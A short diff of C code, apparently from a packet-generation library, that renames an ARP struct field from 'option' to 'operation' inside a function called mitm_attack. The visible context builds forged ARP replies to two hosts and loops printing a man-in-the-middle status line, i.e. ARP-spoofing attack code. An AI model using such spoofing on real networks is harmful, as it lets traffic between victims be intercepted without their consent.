@@ -35,7 +35,7 @@ void mitm_attack(const char* ip1, const char* mac1,
 	pack_to_target1.ARP.srcIp  = ip2;
 	pack_to_target1.ARP.dstEth = mac1;
 	pack_to_target1.ARP.dstIp  = ip1;
-	pack_to_target1.ARP.option = PGEN_ARPOP_REPLY;
+	pack_to_target1.ARP.operation = PGEN_ARPOP_REPLY;
 
 	pack_to_target2.ETH.src.setmacbydev(dev);
 	pack_to_target2.ETH.dst = mac2;
@@ -43,7 +43,7 @@ void mitm_attack(const char* ip1, const char* mac1,
 	pack_to_target2.ARP.srcIp  = ip1;
 	pack_to_target2.ARP.dstEth = mac2;
 	pack_to_target2.ARP.dstIp  = ip2;
-	pack_to_target2.ARP.option = PGEN_ARPOP_REPLY;
+	pack_to_target2.ARP.operation = PGEN_ARPOP_REPLY;
 
 	for(int i=0; ; i++){
 		printf("0x%04x: %s[%s] <MITM> %s[%s] \n", i, 
